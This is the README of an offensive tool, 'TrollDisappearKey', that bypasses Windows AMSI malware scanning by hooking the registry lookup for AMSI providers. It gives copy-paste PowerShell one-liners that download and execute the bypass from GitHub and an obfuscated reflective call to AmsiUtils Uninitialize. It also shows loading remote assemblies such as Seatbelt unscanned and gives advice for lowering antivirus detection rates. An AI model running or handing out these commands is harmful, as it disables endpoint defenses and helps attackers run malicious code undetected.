## UPDATES
```diff
! UPDATE 26/05/2025
! Added a counter for the .cs/.ps1 files so that after it has completed the redirection of "Software\Microsoft\AMSI\Providers", it will unhook RegOpenKeyExW
! This is to remove the overhead introduced by hooking every RegOpenKeyExW and causing errors
! For the powershell reflective loading and .ps1 script, make sure the process has fully loaded, can run some arbitrary commands first..
```

# TrollDisappearKey
TrollDisappearKey.cs   -> compile into a .exe that can load .exe assemblies without amsi scanning taking place during assembly.load() \
TrollDisappearKeyPS.cs -> compile into a .dll to reflectively load to bypass powershell amsi \
TrollDisappearKeyPS.ps1 -> copy paste into powershell 

# How does it work?
Upon assembly.load(), internals of amsi/clr will search for reg key "Software\Microsoft\AMSI\Providers" to load the relevant provider dlls (i.e security vendor dlls) 
We hook the reg query function and when amsi/clr tries to read "Software\Microsoft\AMSI\Providers" we overwrite its value to "Software\Microsoft\AMSI\Providers "  <- note the space after providers
This breaks the provider dlls loading process and we are able to assembly load any .net assembly we want. For the powershell amsi, its somewhat similar, we break the vendor dll loading and call uninitialize to trigger a reinitialize. 

## .powershell Usage (does not require admin)
![Image](https://github.com/user-attachments/assets/f6b4d83a-ed24-433b-9e2a-4cf6bfe1d1b0)
```
##For PS Script
iex(iwr https://raw.githubusercontent.com/cybersectroll/TrollDisappearKey/refs/heads/main/TrollDisappearKeyPS.ps1 -UseBasicParsing).content

##For PS dll reflective
$code = (iwr https://raw.githubusercontent.com/cybersectroll/TrollDisappearKey/refs/heads/main/TrollDisappearKeyPS.cs -UseBasicParsing).content
Add-Type $code
[TrollDisappearKeyPS]::DisappearKey()
([Ref].Assembly.GetType([System.String]::Join("", "S", "y", "s", "t", "e", "m", ".", "M", "a", "n", "a", "g", "e", "m", "e", "n", "t", ".", "A", "u", "t", "o", "m", "a", "t", "i", "o", "n", ".", "A", "m", "s", "i", "U", "t", "i", "l", "s")).GetMethods('N'+'onPu'+'blic,st'+'at'+'ic') | Where-Object Name -eq Uninitialize).Invoke($object,$null)
```

## Detections 
![Image](https://github.com/user-attachments/assets/60ff00a8-b619-407e-8083-29efc38c632d)

  
## .exe Usage (does not require admin) 
![Image](https://github.com/user-attachments/assets/f1678081-5fa8-4f4d-b7d3-ae9bd2e02a9f)
![Image](https://github.com/user-attachments/assets/7ef91a6a-957f-4c91-80a2-c0b54409917c)

```
TrollDisappearKey.exe <URL TO .EXE ASSEMBLY> <ARGUMENT1,ARGUMENT2>
```

## Example
```
TrollDisappearKey.exe "https://github.com/Flangvik/SharpCollection/raw/refs/heads/master/NetFramework_4.7_x64/Seatbelt.exe" "AMSIProviders"
```
## Detections 
Not too bad since zero effort to evade detection, there's tons of things to improve but i shall leave it to the reader. You can immediately drop it to maybe 5 by altering the ExecuteAssembly() function since its using standard code that's deemed malicious. Can rename/obufscate certain strings like the reg key path and void the use of certain API calls and improve the hook library further \
![Image](https://github.com/user-attachments/assets/e4c80f07-ddbc-4ed6-9ad0-c8e104931f90)


## Features
Nothing actually, its quite barebone with short code profile so anyone can tweak it to their needs  (e.g tweak the code to load .dll assemblies instead of just .exe assemblies)

## Disclaimer
Should only be used for educational purposes!







